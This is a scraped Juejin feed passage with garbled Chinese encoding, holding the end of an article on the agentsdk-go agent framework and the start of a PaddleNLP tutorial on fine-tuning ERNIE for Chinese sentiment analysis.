Â Â Â Â Â Â Â Â {Name:Â <span class="hljs-string">"code-review"</span>,Â Path:Â <span class="hljs-string">".claude/skills/code-review"</span>},
Â Â Â Â },
Â Â Â Â Subagents:Â []subagents.Config{
Â Â Â Â Â Â Â Â {Name:Â <span class="hljs-string">"analyzer"</span>,Â Prompt:Â <span class="hljs-string">"ä¸“æ³¨äºä»£ç åˆ†æ"</span>},
Â Â Â Â },
}
</code></pre>
<h4 data-id="heading-30">äº”å±‚ç¤ºä¾‹è·¯å¾„</h4>
<p>agentsdk-go æä¾›æ¸è¿›å¼å­¦ä¹ è·¯å¾„ï¼š</p>
<ol>
<li>
<ol>
<li><strong>01-basic</strong>ï¼šæœ€å°åŒ–çš„å•æ¬¡è¯·æ±‚/å“åº”</li>
</ol>
</li>
<li>
<ol start="2">
<li><strong>02-cli</strong>ï¼šäº¤äº’å¼ REPLï¼Œæ”¯æŒä¼šè¯å†å²</li>
</ol>
</li>
<li>
<ol start="3">
<li><strong>03-http</strong>ï¼šREST + SSE æœåŠ¡å™¨ï¼ˆç›‘å¬ <code>:8080</code>ï¼‰</li>
</ol>
</li>
<li>
<ol start="4">
<li><strong>04-advanced</strong>ï¼šå®Œæ•´ç®¡é“ï¼ˆä¸­é—´ä»¶ã€Hooksã€MCPã€Sandboxã€Skillsã€Subagentsï¼‰</li>
</ol>
</li>
<li>
<ol start="5">
<li><strong>05-custom-tools</strong>ï¼šé€‰æ‹©æ€§å†…ç½®å·¥å…· + è‡ªå®šä¹‰å·¥å…·æ³¨å†Œ</li>
</ol>
</li>
</ol>
<h3 data-id="heading-31">æ€»ç»“</h3>
<p>agentsdk-go ä¸æ˜¯ç®€å•çš„ API å°è£…ï¼Œè€Œæ˜¯å®Œæ•´çš„ Agent å·¥ç¨‹æ¡†æ¶ï¼š</p>
<ul>
<li>â€¢ <strong>æ¶æ„é€æ˜</strong>ï¼š189 è¡Œæ ¸å¿ƒå¾ªç¯ï¼Œé€»è¾‘æ¸…æ™°å¯è¿½æº¯</li>
<li>â€¢ <strong>èµ„æºé«˜æ•ˆ</strong>ï¼šå•è¿›ç¨‹æ¨¡å‹ï¼Œæ— å†·å¯åŠ¨å¼€é”€</li>
<li>â€¢ <strong>æ‰©å±•çµæ´»</strong>ï¼šå…­å±‚ä¸­é—´ä»¶ + è‡ªå®šä¹‰å·¥å…· + MCP é›†æˆ</li>
<li>â€¢ <strong>ç”Ÿäº§å°±ç»ª</strong>ï¼š90%+ æµ‹è¯•è¦†ç›–ï¼ŒHTTP API å¼€ç®±å³ç”¨</li>
</ul>
<p>å¦‚æœä½ åœ¨ä½¿ç”¨ LangGraph æ—¶æ„Ÿåˆ°æŸç¼šï¼Œæˆ–å›  Claude Agent SDK çš„èµ„æºå ç”¨è€Œå›°æ‰°ï¼Œä¸å¦¨è¯•è¯• agentsdk-goâ€”â€”ä¸€ä¸ªçœŸæ­£ä¸ºå·¥ç¨‹å¸ˆè®¾è®¡çš„ Agent å¼€å‘æ¡†æ¶ã€‚</p>
<h3 data-id="heading-32">å‚è€ƒèµ„æº</h3>
<ul>
<li>â€¢ GitHub ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcexll%2Fagentsdk-go" target="_blank" title="https://github.com/cexll/agentsdk-go" ref="nofollow noopener noreferrer">github.com/cexll/agentâ€¦</a></li>
<li>â€¢ ç¤ºä¾‹ä»£ç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcexll%2Fagentsdk-go%2Ftree%2Fmain%2Fexamples" target="_blank" title="https://github.com/cexll/agentsdk-go/tree/main/examples" ref="nofollow noopener noreferrer">github.com/cexll/agentâ€¦</a></li>
<li>â€¢ Claude Code æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.anthropic.com%2Fen%2Fdocs%2Fagents" target="_blank" title="https://docs.anthropic.com/en/docs/agents" ref="nofollow noopener noreferrer">docs.anthropic.com/en/docs/ageâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åŸºäºPaddleå¾®è°ƒERNIEçš„ä¸­æ–‡æƒ…æ„Ÿåˆ†æå®æˆ˜æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7592878531668869146</link>    <guid>https://juejin.cn/post/7592878531668869146</guid>    <pubDate>2026-01-09T01:39:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592878531668869146" data-draft-id="7592431064976818191" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åŸºäºPaddleå¾®è°ƒERNIEçš„ä¸­æ–‡æƒ…æ„Ÿåˆ†æå®æˆ˜æ•™ç¨‹"/> <meta itemprop="keywords" content="æ·±åº¦å­¦ä¹ ,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2026-01-09T01:39:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="YukiMori23"/> <meta itemprop="url" content="https://juejin.cn/user/4022441007125707"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åŸºäºPaddleå¾®è°ƒERNIEçš„ä¸­æ–‡æƒ…æ„Ÿåˆ†æå®æˆ˜æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4022441007125707/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    YukiMori23
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T01:39:14.000Z" title="Fri Jan 09 2026 01:39:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»23åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">åŸºäºPaddleå¾®è°ƒERNIEçš„ä¸­æ–‡æƒ…æ„Ÿåˆ†æå®æˆ˜æ•™ç¨‹</h2>
<h3 data-id="heading-1">1. å¼•è¨€</h3>
<p>æ¬¢è¿æ¥åˆ° PaddleNLP å®æˆ˜æ•™ç¨‹ç³»åˆ—ï¼æœ¬æ¬¡æ•™ç¨‹å°†å¸¦æ‚¨è¿›å…¥è‡ªç„¶è¯­è¨€å¤„ç† (NLP) ä¸­æœ€ç»å…¸ã€æœ€å¹¿æ³›åº”ç”¨çš„ä»»åŠ¡ä¹‹ä¸€ï¼š<strong>æƒ…æ„Ÿåˆ†æ (Sentiment Analysis)</strong> ã€‚æˆ‘ä»¬å°†ä½¿ç”¨å¼ºå¤§çš„é¢„è®­ç»ƒæ¨¡å‹Â <strong>ERNIE</strong>Â æ¥å¯¹ä¸­æ–‡æ–‡æœ¬è¿›è¡Œæƒ…æ„Ÿå€¾å‘çš„åˆ¤æ–­ã€‚</p>
<h4 data-id="heading-2">1.1 ä»€ä¹ˆæ˜¯æƒ…æ„Ÿåˆ†æï¼Ÿ</h4>
<p>æƒ…æ„Ÿåˆ†æï¼Œåˆç§°ä¸ºæ„è§æŒ–æ˜ (Opinion Mining)ï¼Œæ˜¯åˆ©ç”¨è‡ªç„¶è¯­è¨€å¤„ç†ã€æ–‡æœ¬åˆ†æå’Œè®¡ç®—è¯­è¨€å­¦ç­‰æ–¹æ³•ï¼Œå¯¹å¸¦æœ‰æƒ…æ„Ÿè‰²å½©çš„ä¸»è§‚æ€§æ–‡æœ¬è¿›è¡Œæå–ã€åˆ†æã€å½’çº³å’Œæ¨ç†çš„è¿‡ç¨‹ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒçš„ç›®æ ‡å°±æ˜¯<strong>è¯†åˆ«å’Œåˆ¤æ–­ä¸€æ®µæ–‡æœ¬æ‰€è¡¨è¾¾çš„æƒ…æ„Ÿæ˜¯ç§¯æçš„ï¼ˆæ­£é¢ï¼‰ã€æ¶ˆæçš„ï¼ˆè´Ÿé¢ï¼‰ï¼Œè¿˜æ˜¯ä¸­æ€§çš„</strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œç»™å®šä¸€æ¡ç”¨æˆ·è¯„ä»·ï¼š"è¿™å®¶é¤å…çš„çƒ¤é¸­å‘³é“ç»äº†ï¼Œç¯å¢ƒä¹Ÿå¾ˆæ£’ï¼"ï¼Œæƒ…æ„Ÿåˆ†æç³»ç»Ÿåº”è¯¥èƒ½åˆ¤æ–­å‡ºè¿™æ˜¯ä¸€æ¡<strong>ç§¯æ</strong>çš„è¯„ä»·ã€‚è€Œå¯¹äº"ç­‰äº†åŠä¸ªå¤šå°æ—¶æ‰ä¸Šèœï¼Œå‘³é“ä¹Ÿå¾ˆä¸€èˆ¬"ï¼Œåˆ™åº”åˆ¤æ–­ä¸º<strong>æ¶ˆæ</strong>ã€‚</p>
<h4 data-id="heading-3">1.2 æƒ…æ„Ÿåˆ†æçš„åº”ç”¨åœºæ™¯å’Œé¡¹ç›®æ„ä¹‰</h4>
<p>æƒ…æ„Ÿåˆ†ææŠ€æœ¯åœ¨å•†ä¸šå’Œç ”ç©¶é¢†åŸŸéƒ½æœ‰ç€å·¨å¤§çš„åº”ç”¨ä»·å€¼ï¼Œæ˜¯è®¸å¤šæ™ºèƒ½åº”ç”¨çš„åŸºç¡€æ¨¡å—ã€‚</p>






























<table><thead><tr><th>åº”ç”¨é¢†åŸŸ</th><th>å…·ä½“åœºæ™¯</th><th>é¡¹ç›®æ„ä¹‰</th></tr></thead><tbody><tr><td><strong>å•†ä¸šæ™ºèƒ½</strong></td><td>èˆ†æƒ…ç›‘æ§ã€å“ç‰Œå£°èª‰ç®¡ç†ã€äº§å“è¯„ä»·åˆ†æ</td><td>å®æ—¶äº†è§£å…¬ä¼—æƒ…ç»ªï¼Œä¼˜åŒ–äº§å“ï¼Œè¿›è¡Œå±æœºå…¬å…³</td></tr><tr><td><strong>å®¢æˆ·å…³ç³»</strong></td><td>åˆ†æå®¢æœå¯¹è¯ã€æœåŠ¡å·¥å•ã€ç”¨æˆ·æ»¡æ„åº¦é—®å·</td><td>è‡ªåŠ¨è¯„ä¼°å®¢æˆ·æ»¡æ„åº¦ï¼Œå‘ç°æœåŠ¡ç—›ç‚¹ï¼Œæå‡æœåŠ¡è´¨é‡</td></tr><tr><td><strong>é‡‘èç§‘æŠ€</strong></td><td>åˆ†æè´¢ç»æ–°é—»ã€ç¤¾äº¤åª’ä½“æƒ…ç»ªã€è‚¡è¯„</td><td>è¾…åŠ©é‡åŒ–äº¤æ˜“å’ŒæŠ•èµ„å†³ç­–</td></tr><tr><td><strong>ç¤¾ä¼šç§‘å­¦</strong></td><td>åˆ†æå…¬ä¼—å¯¹ç‰¹å®šç¤¾ä¼šäº‹ä»¶æˆ–æ”¿ç­–çš„æƒ…æ„Ÿå€¾å‘</td><td>ä¸ºç¤¾ä¼šå­¦ã€ä¼ æ’­å­¦ç­‰é¢†åŸŸçš„ç ”ç©¶æä¾›æ•°æ®å‚è€ƒ</td></tr></tbody></table>
<p>æœ¬é¡¹ç›®æ—¨åœ¨é€šè¿‡ä¸€ä¸ªå®Œæ•´çš„å®æˆ˜æ¡ˆä¾‹ï¼Œè®©æ‚¨æŒæ¡å¦‚ä½•åˆ©ç”¨é¢„è®­ç»ƒæ¨¡å‹è§£å†³çœŸå®åœºæ™¯ä¸‹çš„æ–‡æœ¬åˆ†ç±»é—®é¢˜ï¼Œä¸ºæ‚¨åœ¨è‡ªå·±çš„ä¸šåŠ¡æˆ–ç ”ç©¶ä¸­åº”ç”¨NLPæŠ€æœ¯æ‰“ä¸‹åšå®çš„åŸºç¡€ã€‚</p>
<h4 data-id="heading-4">1.3 ä¸ºä»€ä¹ˆé€‰æ‹© ERNIE æ¨¡å‹ï¼Ÿ</h4>
<p>åœ¨ä¼—å¤šé¢„è®­ç»ƒæ¨¡å‹ä¸­ï¼Œæˆ‘ä»¬é€‰æ‹©Â <strong>ERNIE</strong>Â ä½œä¸ºæœ¬æ¬¡æ•™ç¨‹çš„æ ¸å¿ƒï¼Œä¸»è¦æœ‰ä»¥ä¸‹åŸå› ï¼š</p>
<p><strong>1. æ›´æ‡‚ä¸­æ–‡çš„é¢„è®­ç»ƒæœºåˆ¶</strong>ï¼šERNIE æ˜¯ç”±ç™¾åº¦æå‡ºçš„ã€é’ˆå¯¹ä¸­æ–‡è¯­è¨€ç‰¹ç‚¹è¿›è¡Œæ·±åº¦ä¼˜åŒ–çš„é¢„è®­ç»ƒæ¨¡å‹ã€‚å®ƒä¸ä»…ä»…å­¦ä¹ å­—ä¸å­—ä¹‹é—´çš„å…³ç³»ï¼Œè¿˜é€šè¿‡<strong>çŸ¥è¯†æ©ç ç­–ç•¥ (Knowledge Masking Strategies)</strong> Â å­¦ä¹ äº†æ›´å®Œæ•´çš„è¯­ä¹‰å•å…ƒï¼ˆå¦‚è¯ã€çŸ­è¯­å’Œå®ä½“ï¼‰ã€‚</p>
<ul>
<li><strong>ä¸€ä¸ªç”ŸåŠ¨çš„æ¯”å–»</strong>ï¼šå¦‚æœæŠŠæ™®é€šæ¨¡å‹çš„å­¦ä¹ æ¯”ä½œåš"å®Œå½¢å¡«ç©º"ï¼Œæ¯æ¬¡åªæŒ–æ‰ä¸€ä¸ªå­—è®©å®ƒçŒœï¼›é‚£ä¹ˆERNIEçš„å­¦ä¹ å°±åƒæ˜¯åœ¨åšæ›´éš¾çš„"æˆè¯­å¡«ç©º"æˆ–"äººåå¡«ç©º"ã€‚ä¾‹å¦‚ï¼Œå®ƒä¼šæŠŠ"å“ˆåˆ©Â·æ³¢ç‰¹"æ•´ä¸ªè¯æŒ–æ‰ï¼Œç„¶åå»é¢„æµ‹è¿™ä¸ªè¢«æŒ–æ‰çš„å®ä½“ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒERNIEè¢«è¿«å­¦ä¹ åˆ°äº†"å“ˆåˆ©Â·æ³¢ç‰¹"æ˜¯ä¸€ä¸ªäººåï¼Œä»¥åŠä¸å®ƒç›¸å…³çš„å¤æ‚è¯­ä¹‰ï¼Œè€Œä¸æ˜¯ä»…ä»…æŠŠè¿™å‡ ä¸ªå­—çœ‹ä½œå­¤ç«‹çš„ç¬¦å·ã€‚</li>
</ul>
<p>è¿™ç§å¯¹çŸ¥è¯†çš„æ·±åº¦å­¦ä¹ ä½¿å¾—ERNIEåœ¨å¤„ç†ä¸­æ–‡ä»»åŠ¡æ—¶ï¼Œè¯­ä¹‰ç†è§£èƒ½åŠ›æ›´èƒœä¸€ç­¹ã€‚</p>
<p><strong>2. ä¸°å¯Œçš„æ¨¡å‹é€‰æ‹©ä¸é€‚ä¸­çš„è§„æ¨¡</strong>ï¼šPaddleNLP æä¾›äº†è¦†ç›–ä»å¤§åˆ°å°çš„å®Œæ•´ERNIEæ¨¡å‹å®¶æ—ã€‚å¯¹äºæœ¬æ•™ç¨‹ï¼Œæˆ‘ä»¬é€‰æ‹©Â <code>ernie-3.0-medium-zh</code>ï¼Œå®ƒåœ¨æ€§èƒ½å’Œèµ„æºæ¶ˆè€—ä¹‹é—´å–å¾—äº†å¾ˆå¥½çš„å¹³è¡¡ã€‚</p>
<p>ä¸‹è¡¨å±•ç¤ºäº†PaddleNLPä¸­æ”¯æŒçš„éƒ¨åˆ†ERNIEä¸­æ–‡æ¨¡å‹ï¼š</p>





























































<table><thead><tr><th>æ¨¡å‹åç§° (Pretrained Weight)</th><th>å±‚æ•°</th><th>éšè—å±‚å¤§å°</th><th>æ³¨æ„åŠ›å¤´æ•°</th><th>å‚æ•°é‡</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td><code>ernie-1.0-base-zh</code></td><td>12</td><td>768</td><td>12</td><td>108M</td><td>ç»å…¸çš„åŸºç¡€ç‰ˆERNIE</td></tr><tr><td><code>ernie-3.0-base-zh</code></td><td>12</td><td>768</td><td>12</td><td>118M</td><td>ERNIE 3.0çš„åŸºç¡€ç‰ˆ</td></tr><tr><td><strong><code>ernie-3.0-medium-zh</code></strong></td><td><strong>6</strong></td><td><strong>768</strong></td><td><strong>12</strong></td><td><strong>75M</strong></td><td><strong>æœ¬æ•™ç¨‹é€‰ç”¨ï¼Œè§„æ¨¡é€‚ä¸­ï¼Œæ•ˆæœä¼˜å¼‚</strong></td></tr><tr><td><code>ernie-3.0-mini-zh</code></td><td>6</td><td>384</td><td>12</td><td>27M</td><td>æ›´è½»é‡çš„ç‰ˆæœ¬</td></tr><tr><td><code>ernie-3.0-micro-zh</code></td><td>4</td><td>384</td><td>12</td><td>23M</td><td>å¾®å‹ç‰ˆæœ¬</td></tr><tr><td><code>ernie-3.0-xbase-zh</code></td><td>20</td><td>1024</td><td>16</td><td>296M</td><td>æ›´å¤§æ›´å¼ºçš„ç‰ˆæœ¬</td></tr></tbody></table>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>ernie-3.0-medium-zh</code>Â (75Må‚æ•°) æ¯”Â <code>base</code>Â (118Må‚æ•°) æ›´è½»é‡ï¼Œä½¿å¾—æˆ‘ä»¬åœ¨æ™®é€šçš„GPUä¸Šä¹Ÿèƒ½å¿«é€Ÿå®Œæˆè®­ç»ƒï¼Œéå¸¸é€‚åˆä½œä¸ºå…¥é—¨å’Œæ•™å­¦çš„æ¨¡å‹ã€‚</p>
<h4 data-id="heading-5">1.4 æœ¬æ•™ç¨‹çš„ç›®æ ‡ä¸å†…å®¹</h4>
<p>æœ¬æ•™ç¨‹é¢å‘å¯¹NLPå’Œæ·±åº¦å­¦ä¹ æœ‰åŸºæœ¬äº†è§£ï¼Œå¹¶å¸Œæœ›åŠ¨æ‰‹å®è·µè§£å†³çœŸå®é—®é¢˜çš„å¼€å‘è€…å’Œå­¦ä¹ è€…ã€‚é€šè¿‡æœ¬æ•™ç¨‹ï¼Œæ‚¨å°†ï¼š</p>
<ul>
<li>ç†è§£æƒ…æ„Ÿåˆ†æä»»åŠ¡çš„åŸºæœ¬æµç¨‹ã€‚</li>
<li>å­¦ä¼šä½¿ç”¨ PaddleNLP åŠ è½½å’Œå¤„ç†ä¸­æ–‡æ•°æ®é›†ã€‚</li>
<li>æŒæ¡å¦‚ä½•åŠ è½½é¢„è®­ç»ƒçš„ ERNIE æ¨¡å‹ï¼Œå¹¶é’ˆå¯¹ç‰¹å®šä»»åŠ¡è¿›è¡Œå¾®è°ƒ (Fine-tuning)ã€‚</li>
<li>ä»é›¶å¼€å§‹ï¼Œç”¨ä¸åˆ°100è¡Œæ ¸å¿ƒä»£ç ï¼Œè®­ç»ƒä¸€ä¸ªé«˜ç²¾åº¦çš„ä¸­æ–‡æƒ…æ„Ÿåˆ†ææ¨¡å‹ã€‚</li>
<li>å­¦ä¼šè¯„ä¼°æ¨¡å‹æ€§èƒ½ï¼Œå¹¶ä½¿ç”¨è®­ç»ƒå¥½çš„æ¨¡å‹å¯¹æ–°çš„æ–‡æœ¬è¿›è¡Œæƒ…æ„Ÿé¢„æµ‹ã€‚</li>
</ul>
<p>è®©æˆ‘ä»¬å¼€å§‹å§ï¼</p>
<h3 data-id="heading-6">2. ç¯å¢ƒå‡†å¤‡</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿å®‰è£…äº†å¿…éœ€çš„åº“ã€‚æœ¬æ•™ç¨‹ä¸»è¦ä¾èµ– PaddlePaddle å’Œ PaddleNLPã€‚</p>
<p>In [36]</p>
<pre><code class="hljs language-css" lang="css">!pip install <span class="hljs-attr">--upgrade</span> <span class="hljs-attr">--pre</span> paddlenlp==<span class="hljs-number">3.0</span>.<span class="hljs-number">0</span>b4
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥å¯¼å…¥å¹¶æ£€æŸ¥ç‰ˆæœ¬ä¿¡æ¯ï¼Œä»¥ç¡®ä¿ç¯å¢ƒé…ç½®æ­£ç¡®ã€‚</p>
<p>In [37]</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> paddle
<span class="hljs-keyword">import</span> paddlenlp

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"PaddlePaddle Version: <span class="hljs-subst">{paddle.__version__}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"PaddleNLP Version: <span class="hljs-subst">{paddlenlp.__version__}</span>"</span>)

<span class="hljs-comment"># æ£€æŸ¥GPUæ˜¯å¦å¯ç”¨</span>
<span class="hljs-keyword">if</span> paddle.is_compiled_with_cuda():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"PaddlePaddle is compiled with CUDA and GPU is available."</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"PaddlePaddle is not compiled with CUDA. It will use CPU."</span>)
</code></pre>
<p>ç¯å¢ƒå‡†å¤‡éå¸¸ç®€å•ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åŠ è½½ç”¨äºæœ¬æ¬¡ä»»åŠ¡çš„æ•°æ®é›†ã€‚</p>
<h3 data-id="heading-7">3. æ•°æ®å‡†å¤‡</h3>
<p>å¯¹äºæƒ…æ„Ÿåˆ†æä»»åŠ¡ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª<strong>å·²æ ‡æ³¨</strong>çš„æ•°æ®é›†ï¼Œå…¶ä¸­æ¯æ¡æ–‡æœ¬éƒ½å¯¹åº”ä¸€ä¸ªæƒ…æ„Ÿæ ‡ç­¾ï¼ˆå¦‚"ç§¯æ"æˆ–"æ¶ˆæ"ï¼‰ã€‚</p>
<h4 data-id="heading-8">3.1 åŠ è½½ ChnSentiCorp æ•°æ®é›†</h4>
<p>PaddleNLP å†…ç½®äº†è®¸å¤šå¸¸ç”¨çš„NLPæ•°æ®é›†ï¼ŒåŒ…æ‹¬ä¸­æ–‡æƒ…æ„Ÿåˆ†æé¢†åŸŸçš„ç»å…¸æ•°æ®é›†Â <strong><code>ChnSentiCorp</code></strong>ã€‚è¿™ä¸ªæ•°æ®é›†åŒ…å«é…’åº—ã€ä¹¦ç±ã€ç”µè„‘ç­‰å¤šä¸ªé¢†åŸŸçš„è¯„è®ºæ•°æ®ï¼Œæ¯æ¡è¯„è®ºè¢«æ ‡æ³¨ä¸ºæ­£é¢ï¼ˆæ ‡ç­¾<code>1</code>ï¼‰æˆ–è´Ÿé¢ï¼ˆæ ‡ç­¾<code>0</code>ï¼‰ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Â <code>paddlenlp.datasets.load_dataset</code>Â å‡½æ•°ä¸€é”®åŠ è½½å®ƒã€‚</p>
<p>In [38]</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> paddlenlp.datasets <span class="hljs-keyword">import</span> load_dataset

<span class="hljs-comment"># åŠ è½½ChnSentiCorpæ•°æ®é›†çš„è®­ç»ƒé›†ã€å¼€å‘é›†å’Œæµ‹è¯•é›†</span>
train_ds, dev_ds, test_ds = load_dataset(
    <span class="hljs-string">'chnsenticorp'</span>, splits=[<span class="hljs-string">'train'</span>, <span class="hljs-string">'dev'</span>, <span class="hljs-string">'test'</span>]
)

<span class="hljs-comment"># æŸ¥çœ‹æ•°æ®é›†ä¿¡æ¯</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"è®­ç»ƒé›†æ ·æœ¬æ•°é‡: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(train_ds)}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å‘é›†æ ·æœ¬æ•°é‡: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(dev_ds)}</span>"</span>)   <span class="hljs-comment">#å¼€å‘é›†ç”¨äºæ¨¡å‹çš„è°ƒä¼˜ï¼Œå¦‚è°ƒæ•´è¶…å‚æ•°ï¼Ÿï¼Ÿ</span>
